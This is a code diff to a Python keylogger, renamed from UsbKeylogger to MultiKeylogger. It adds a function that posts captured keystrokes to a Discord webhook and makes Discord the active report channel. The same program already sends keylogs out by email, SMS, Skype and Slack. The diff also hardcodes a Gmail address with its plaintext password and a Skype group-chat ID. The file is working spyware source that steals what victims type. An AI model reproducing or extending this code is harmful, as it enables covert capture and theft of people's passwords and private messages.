@@ -13,18 +13,23 @@ import os
 
 from skpy import Skype # Imported to use Skype
 
+import requests 
+
 load_dotenv() # Loads environment to use variable in .env
 SLACK_BOT_TOKEN = os.environ['SLACK_BOT_TOKEN']
 slackBot = WebClient(SLACK_BOT_TOKEN)
+
+DISCORD_URL = os.environ['DISCORD_WEBHOOK']
+PHONE = os.environ['PHONE_NUMBER']
 
 # Email Variables for report type of emails
 EMAIL = "ph4ntom77projects@gmail.com" # Email that reports are sent to
 EMAIL_PW = "keylogger!!" # Password for Email
 
 # Time Interval Variable
-LOG_INTERVAL = 15 # Every 300 Seconds (5 minutes) a report is sent
+LOG_INTERVAL = 25 # Every 300 Seconds (5 minutes) a report is sent
 
-class UsbKeylogger:
+class MultiKeylogger:
     def __init__(self, reportInterval, reportType):
         self.reportInterval = reportInterval
         self.reportType = reportType
@@ -66,20 +71,32 @@ class UsbKeylogger:
         text = smtplib.SMTP(host = "smtp.gmail.com", port = 587) # Port 587 is used encrypt SMTP messages using TLS
         text.starttls() # Starts TLS for security
         text.login(address, password) # Logs into the email with provided address and password
-        with open("phone.txt") as f: # Opens phone.txt file
-            phoneNumber = f.readline().rstrip() # Reads the first line, which a AT&T phone number (no hyphens)
-        phoneMail = "" + phoneNumber + "@mms.att.net" # Creates a string variable that combined phone number from file with correlating AT&T email domain
+        phoneMail = "" + PHONE + "@mms.att.net" # Creates a string variable that combined phone number from file with correlating AT&T email domain
         text.sendmail(address, phoneMail, textBody) # Sends a text of the keylogs the specified AT&T phone number from gmail address
         text.quit() # Terminates the text server
 
-    # def reportDiscord(self):
+    def reportDiscord(self, discordBody, logTime):
+        discordMessage = logTime + "\n" + discordBody
+        data = {
+            "content": discordMessage,
+            "username": "Keylogger"
+        }
+        messagePost = requests.post(DISCORD_URL, json = data)
+        try:
+            messagePost.raise_for_status()
+        except requests.exceptions.HTTPError as err:
+            print(err)
+        else:
+            print("Discord message sent succesfully!")
+
+
     def reportSkype(self, email, password, skypeBody, logTime):
         skypeMessage = "" + logTime + "\n" + skypeBody # Creates string variable containing log time frame and key logs on the next line
         # print(skype.chats.recent()) - Used to discover Skype group chat ID of the most recently active Skype group chat
         channelID = "19:5a0aa427a4634e229bfc6360e4b94f78@thread.skype" # Creates channelID set to my keylogger group chat
         skype = Skype(email, password) # Logs into Skype
         skypeChannel = skype.chats.chat(channelID) # Sets skypeChannel equal to the chat of a specific ID
-        skypeChannel.sendMsg(skypeMessage) # Sends a message of the keylogs to the Skype group channl
+        skypeChannel.sendMsg(skypeMessage) # Sends a message of the keylogs to the Skype group channel
 
     def callbackKeyboard(self, event):
         eventName = "[" + event.name + "]"# Create eventName variable
@@ -111,6 +128,9 @@ class UsbKeylogger:
                 self.reportSMS(EMAIL, EMAIL_PW, self.keylog) # Calls the reportSMS function to send keylogs via an SMS to an AT&T phone number
             elif self.reportType == "Skype":
                 self.reportSkype(EMAIL, EMAIL_PW, self.keylog, self.identifier) # Calls the reportSkype function to send keylogs to a desginated Skype group chat
+            elif self.reportType == "Discord":
+                self.reportDiscord(self.keylog, self.identifier) # Calls the reportDiscord function to send keylogs to a desginated Discord group chat
+            
             self.startTimeVal = datetime.now() # Retrieves the start datetime for utilization in file identifying
         
         self.keylog = "" # Resets the value of self.keylog to contain nothing
@@ -128,13 +148,13 @@ if __name__ == "__main__":
         """
         Uncomment the report type desired and comment the others
         """
-        #usbKeylogger = UsbKeylogger(reportInterval = LOG_INTERVAL, reportType = "Email")
-        #usbKeylogger = UsbKeylogger(reportInterval = LOG_INTERVAL, reportType = "File")
-        #usbKeylogger = UsbKeylogger(reportInterval = LOG_INTERVAL, reportType = "Discord")
-        #usbKeylogger = UsbKeylogger(reportInterval = LOG_INTERVAL, reportType = "Slack")
-        #usbKeylogger = UsbKeylogger(reportInterval = LOG_INTERVAL, reportType = "SMS")
-        usbKeylogger = UsbKeylogger(reportInterval = LOG_INTERVAL, reportType = "Skype")
-        usbKeylogger.start()
+        #multiKeylogger = MultiKeylogger(reportInterval = LOG_INTERVAL, reportType = "Email")
+        #multiKeylogger = MultiKeylogger(reportInterval = LOG_INTERVAL, reportType = "File")
+        multiKeylogger = MultiKeylogger(reportInterval = LOG_INTERVAL, reportType = "Discord")
+        #multiKeylogger = MultiKeylogger(reportInterval = LOG_INTERVAL, reportType = "Slack")
+        #multiKeylogger = MultiKeylogger(reportInterval = LOG_INTERVAL, reportType = "SMS")
+        #multiKeylogger = MultiKeylogger(reportInterval = LOG_INTERVAL, reportType = "Skype")
+        multiKeylogger.start()
 
 
 
